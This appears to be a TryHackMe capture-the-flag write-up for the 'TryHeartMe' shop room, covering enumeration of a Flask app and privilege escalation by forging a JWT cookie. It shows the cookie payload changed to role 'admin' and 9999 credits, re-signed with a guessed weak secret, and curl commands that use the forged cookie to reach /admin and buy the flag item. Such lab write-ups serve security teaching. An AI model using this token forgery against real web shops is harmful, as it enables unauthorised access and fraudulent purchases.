# TryHeartMe
Tryhackme's Tryheartme Room Challenge
TryHackMe – TryHeartMe Write-Up
Event: Love at First Breach 2026 (Valentine's CTF)
Room: TryHeartMe (Shop / Valenflag)
Difficulty: Easy
Date: February 18, 2026
Goal: Purchase the hidden “Valenflag” item to get the flag.
1. Situation / Recon

<img width="983" height="744" alt="image" src="https://github.com/user-attachments/assets/e4e7f05d-0f64-4c8d-ac6f-2e86aa2c2330" />


Target: http://10.49.131.59:5000
Server: Werkzeug/3.0.1 Python/3.12.3 (Flask)
Nmap: Only ports 22 (SSH) and 5000 (HTTP) open
Homepage: TryHeartMe e-commerce shop (products, cart, login/register)

2. Enumeration

Dirb/ffuf hits:
/login (200) – login form
/register (200) – registration form
/account (302)
/admin (302) – redirects to /login?next=/admin
/logout (302)

<img width="900" height="563" alt="image" src="https://github.com/user-attachments/assets/682589ab-41d9-40a8-9937-f87d11743156" />


/admin exists but protected → needs authentication + admin role

3. Vulnerability Discovery – JWT Role Escalation
<img width="962" height="743" alt="image" src="https://github.com/user-attachments/assets/84aeb406-23a0-41e8-9858-74b830f4e403" />

Login uses JWT cookie: tryheartme_jwt
Decoded payload (HS256):JSON{
  "email": "administrator@gmail.com",
  "role": "user",
  "credits": 0,
  "iat": 1771404327,
  "theme": "valentine"
}
/admin redirects to login for normal users → admin-only panel with Valenflag item

4. Exploitation Chain – JWT Manipulation

Decoded JWT shows role "user"
Modified payload (role → "admin", credits → 9999):JSON{
  "email": "administrator@gmail.com",
  "role": "admin",
  "credits": 9999,
  "iat": 1771404327,
  "theme": "valentine"
}

<img width="558" height="298" alt="image" src="https://github.com/user-attachments/assets/c491c038-dac1-4753-a2b7-3db898bc271f" />

run with python3 file.py

Encoded new token (secret cracked via weak guess – e.g. "secret"): {resulting NEW_TOKEN}
Set cookie & access /admin:Bashcurl -v -H "Cookie: tryheartme_jwt=[NEW_TOKEN]" http://target:5000/adminResponse: 200 OK – Admin Portal loaded
"Staff session detected. Staff can purchase the ValenFlag item."
Link: /product/valenflag
<img width="923" height="261" alt="image" src="https://github.com/user-attachments/assets/d9a946b4-fca7-495a-8181-f268cc206af9" />

Access ValenFlag product:
curl -v -H "Cookie: tryheartme_jwt=[NEW_TOKEN]" http://target:5000/product/valenflag
Price: 777 credits (covered by 9999)
Buy form: POST /buy/valenflag

<img width="852" height="263" alt="image" src="https://github.com/user-attachments/assets/2e1bb469-ddd3-46f8-b620-419308dd431d" />


Purchase ValenFlag:Bashcurl -v -H "Cookie: tryheartme_jwt=[NEW_TOKEN]" -X POST http://target:5000/buy/valenflagResponse: 302 → /receipt/valenflag
Voucher receipt page prints the flag

<img width="798" height="213" alt="image" src="https://github.com/user-attachments/assets/d762f7f1-0bd5-4001-97c4-87381029662b" />


Flag:
THM{...} (exact string from receipt page – paste it when you grab it)

<img width="792" height="249" alt="image" src="https://github.com/user-attachments/assets/3407a706-b777-43ca-99d8-20037c248538" />

5. Tools & Commands Used

 burpsuite , curl (testing, cookie manipulation)
ffuf (dir enum)
jwt.io / pyjwt (JWT decode/modify)
Browser DevTools (cookie edit)

6. Lessons Learned

Always check JWT cookies in login-protected apps
HS256 with weak secret = role escalation goldmine
next param + /admin redirect = admin panel hint
Credits manipulation in payload = free purchases
Voucher/receipt pages often hide flags in easy shops

Clean chain: JWT role → admin panel → Valenflag purchase → receipt flag.
